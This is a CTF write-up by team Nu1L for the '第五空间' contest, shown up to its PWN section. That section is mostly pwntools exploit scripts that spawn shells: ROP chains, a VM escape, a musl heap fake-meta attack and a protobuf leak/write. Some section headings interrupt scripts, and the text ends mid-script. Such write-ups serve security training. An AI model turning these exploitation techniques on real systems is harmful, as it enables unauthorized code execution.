第五空间 WriteUp By Nu1L
第五空间 WriteUp By Nu1L
PWN
bountyhunter
CrazyVM
notegame
pb
Crypto
ecc
signin
doublesage
Blockchain
CallBox
Web
EasyCleanup
pklovecloud
PNG图⽚转换器
yet_another_mysql_injection
WebFTP
个⼈信息保护
data_protection
Mobile
uniapp
Misc
签到题
云安全
Cloud_QM
PWN
bountyhunter
from pwn import *
s = remote("139.9.123.168",32548)
#s = process("./pwn")
sh = 0x403408
pop_rdi = 0x000000000040120b
payload = b'A'*0x98+p64(pop_rdi)+p64(sh)+p64(pop_rdi+1)+p64(0x401030)
# open("./payload","wb").write(payload)
s.sendline(payload)
s.interactive()
CrazyVM
from pwn import *
def movReg(typea,typeb,reg1,reg2):
    opcode = b'\x01'
    opcode += p8(typea)+p8(typeb)+p8(reg1)+p8(reg2)
    return opcode.ljust(8,b'\x00')
def movi(typeb,reg1,val):
    opcode = b'\x01'
    opcode += p8(1)+p8(typeb)+p8(reg1)+p32(val)
    return opcode.ljust(8,b'\x00')
def push(reg):
    opcode = b'\x12'
    opcode += b'\x04\x03'
    opcode += p8(reg)
    return opcode.ljust(8,b'\x00')
def pop(reg):
    opcode = b'\x13'
    opcode += b'\x04\x03'
    opcode += p8(reg)
    return opcode.ljust(8,b'\x00')
def addReg(typea,typeb,reg1,reg2):
    opcode = b'\x02'
    opcode += p8(typea)+p8(typeb)+p8(reg1)+p8(reg2)
    return opcode.ljust(8,b'\x00')
def subReg(typea,typeb,reg1,reg2):
    opcode = b'\x03'
    opcode += p8(typea)+p8(typeb)+p8(reg1)+p8(reg2)
    return opcode.ljust(8,b'\x00')
def bye():
    return b'\x00\x05\x03'.ljust(8,b'\x00')
opcode = b''
# s = process("./CrazyVM")
s = remote("114.115.221.217","49153")
libc = ELF("./libc-2.31.so")
pop_rdi = 0x0000000000026b72
sh = 0x001b75aa
system = libc.sym['system']
opcode += movReg(0,3,0,0x10)        #reg0 libc offset
notegame
opcode += movi(2,0x11,0x100ff0-0x80000)
opcode += addReg(0,3,0,0x11)
opcode += movReg(0,3,0x10,0)
opcode += movi(2,0x11,0x1ef2e0)
opcode += addReg(0,3,0x10,0x11)
opcode += pop(1)                    #reg1 environ
opcode += movReg(0,3,0x10,0)
opcode += movi(2,0x11,0x1ec5a0)
opcode += addReg(0,3,0x10,0x11)
opcode += pop(2)
opcode += movi(2,0x11,0x1ec5c0)
opcode += subReg(0,3,2,0x11)        #reg2 libc
opcode += movReg(0,3,3,1)
opcode += subReg(0,3,3,2)
opcode += addReg(0,3,3,0)           #reg3 stack offset
opcode += movi(2,0x11,0x100-4*8)
opcode += subReg(0,3,3,0x11)
opcode += movReg(0,3,0x10,3)
opcode += movReg(0,3,4,2)
opcode += movi(2,0x11,pop_rdi)
opcode += addReg(0,3,4,0x11)        #reg4 pop rdi
opcode += movReg(0,3,5,2)
opcode += movi(2,0x11,sh)
opcode += addReg(0,3,5,0x11)        #reg5 sh
opcode += movReg(0,3,6,2)
opcode += movi(2,0x11,system)
opcode += addReg(0,3,6,0x11)        #reg6 system
opcode += movReg(0,3,7,2)
opcode += movi(2,0x11,pop_rdi+1)
opcode += addReg(0,3,7,0x11) 
opcode += push(6)+push(7)+push(5)+push(4)
opcode += bye()
# gdb.attach(s,"b *$rebase(0x174e)\nc")
s.sendafter(b"input code for vm: ",opcode)
s.sendafter(b"input data for vm: ",b"\n")
s.interactive()
from pwn import *
def add(size,buf):
    s.sendlineafter(b"Note@Game:~$",b"AddNote")
    s.sendlineafter(b"Size: ",str(size).encode())
    s.sendafter(b"Note: ",buf)
def show(idx):
    s.sendlineafter(b"Note@Game:~$",b"ShowNote")
    s.sendlineafter(b"Index: ",str(idx).encode())
def edit(idx,buf):
    s.sendlineafter(b"Note@Game:~$",b"EditNote")
    s.sendlineafter(b"Index: ",str(idx).encode())
    s.sendafter(b"Note: ",buf)
def free(idx):
    s.sendlineafter(b"Note@Game:~$",b"DelNote")
    s.sendlineafter(b"Index: ",str(idx).encode())
def update(size,buf,info):
    s.sendlineafter(b"Note@Game:~$",b"UpdateInfo")
    s.sendlineafter(b"Length: ",str(size).encode())
    s.sendafter(b"Name: ",buf)
    s.sendafter(b"Info: ",info)
def view():
    s.sendlineafter(b"Note@Game:~$",b"ViewInfo")
# s = process("./notegame")
s = remote("114.115.152.113","49153")
add(0x20,b'\n')
update(0x10,b'dead\n',b'\n')
update(0x20,b'A'*0x20,b'\n')
view()
s.recvuntil(b"A"*0x20)
libc = ELF("./libc.so")
libc.address = u64(s.recv(6)+b"\x00\x00")-0xb7c90
success(hex(libc.address))
s.sendlineafter(b"Note@Game:~$",b"B4ckD0or")
s.sendlineafter(b"Addr: ",str(libc.address+0xb4ac0).encode())
# update(0x20,'deadbeef\n',b'\n')
# add(0x30,b'AAAA\n')
s.recvuntil(b"Mem: ")
secret = u64(s.recv(8))
success(hex(secret))
free(0)
fake_meta_addr = 0x10000000010
fake_mem_addr = libc.address+0xb7ac0
sc = 9 # 0x9c
freeable = 1
last_idx = 1
maplen = 2
stdin_FILE = libc.address+0xb4180+0x30
add(0x68,b'A\n')#0
add(0x6c,p64(stdin_FILE-0x10)+p64(0)+p64((maplen << 12) | (sc << 6) | (freeable << 5) | 
last_idx)+p64(0)+b"\n")#1
edit(0,b'\x00'*0x60+p64(fake_meta_addr))
fake_meta = p64(stdin_FILE-0x18)#next
fake_meta += p64(fake_meta_addr+0x30)#priv
fake_meta += p64(fake_mem_addr)
fake_meta += p64(2)
fake_meta += p64((maplen << 12) | (sc << 6) | (freeable << 5) | last_idx)
fake_meta += p64(0)
s.sendlineafter(b"Note@Game:~$",b"TempNote")
s.sendlineafter(b"Input the address of your temp note: ",str(0x10000000000))
s.sendafter(b"Temp Note: ",p64(secret)+p64(0)+fake_meta+b"\n")
free(1)
add(0x90,b'A\n')
fake_meta = p64(stdin_FILE-0x18)#next
fake_meta += p64(fake_mem_addr)#priv
fake_meta += p64(stdin_FILE-0x10)
fake_meta += p64(2)
fake_meta += p64((maplen << 12) | (sc << 6) | (freeable << 5) | last_idx)
fake_meta += p64(0)
fake_meta += p64(stdin_FILE-0x18)
fake_meta += p64(fake_mem_addr)
fake_meta += p64(stdin_FILE-0x10)
fake_meta += p64(0)
fake_meta += p64((maplen << 12) | (sc << 6) | (freeable << 5) | last_idx)
fake_meta += p64(0)
s.sendlineafter(b"Note@Game:~$",b"TempNote")
s.sendafter(b"Temp Note: ",p64(secret)+p64(0)+fake_meta+b"\n")
# gdb.attach(s,"dir ./mallocng\nb *$rebase(0x1075)\nc")
s.sendlineafter(b"Note@Game:~$",b"AddNote")
s.sendlineafter(b"Size: ",str(0x90).encode())
payload = b'/bin/sh\x00'
payload = payload.ljust(32,b'\x00')
payload += p64(1)+p64(1)+p64(0)*3+p64(libc.sym['system'])
pb
payload = b'A'*48+payload+b"\n"
s.send(payload)
s.interactive()
# protoc ./addressbook.proto --python_out=.
from pwn import *
from addressbook_pb2 import AddressBook, Person
#context.aslr = False
context.log_level = 'debug'
def gen_leak_payload(offset: int):
    person = Person()
    person.show_off = ""
    person.name = "plusls"
    person.bio = "114514"
    #person.rw = True
    person.day.append(offset)
    person.salary.append(1)
    addressbook = AddressBook()
    addressbook.people.append(person)
    data = addressbook.SerializeToString()
    return data
def gen_write_payload(offset: int, data_to_write: int):
    person = Person()
    person.show_off = ""
    person.name = "plusls"
    person.bio = "114514"
    person.rw = True
    person.day.append(offset)
    person.salary.append(data_to_write)
    addressbook = AddressBook()
    addressbook.people.append(person)
    data = addressbook.SerializeToString()
    return data
# 0x8fbbd0
def main():
    heap_ptr = 0
    #p = process('./pb')
    p = remote('114.115.204.229', 49153)
    data = gen_leak_payload(0x20)
    p.recvuntil('size: ')
    p.sendline(str(len(data)))
    p.send(data)
    p.recvuntil('Show me the money: ')
    heap_ptr += int(p.recvuntil('\n'))
    data = gen_leak_payload(0x21)
    p.recvuntil('size: ')
    p.sendline(str(len(data)))
    p.send(data)
    p.recvuntil('Show me the money: ')
    heap_ptr += int(p.recvuntil('\n'))*0x100
    data = gen_leak_payload(0x22)
    p.recvuntil('size: ')
    p.sendline(str(len(data)))